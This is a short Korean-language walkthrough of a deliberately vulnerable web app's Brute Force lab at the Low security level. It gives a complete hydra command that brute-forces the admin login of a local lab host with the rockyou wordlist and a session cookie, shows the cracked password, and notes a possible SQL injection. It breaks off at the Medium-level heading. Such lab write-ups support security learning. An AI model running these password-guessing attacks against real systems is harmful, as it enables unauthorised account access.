
# Brute Force(무차별 대입 공격)

## Security Level : Low

### 풀이

![image](https://github.com/user-attachments/assets/bc2e4c48-49a5-432c-b7dd-c2cae3755d13)

좌측 하단에 username: admin이라고 되어 있다. 그리고 로그인을 실패했을 때 "Username and/or password incorrect." 라는 메시지가 출력된다.

이를 이용해서 hydra를 사용해서 비밀번호를 찾아볼 생각이다.

<img src=https://github.com/user-attachments/assets/fbfb341c-6c73-4582-8e17-1693c05f1edd width 500>

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.110 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=j0hhk5h9tv98ldtfn6aajf83h6; security=low:F=Username and/or password incorrect."

username: admin  
password : password

![image](https://github.com/user-attachments/assets/9e8950f1-766e-4c92-94c6-d2b8330dc09d)

로그인 성공!

### 페이지 소스

![image](https://github.com/user-attachments/assets/48c0354e-f332-4130-8149-19f5548f546f)

필터 없이 입력값을 받아서 sql injection 공격도 가능

## Security Level : Medium
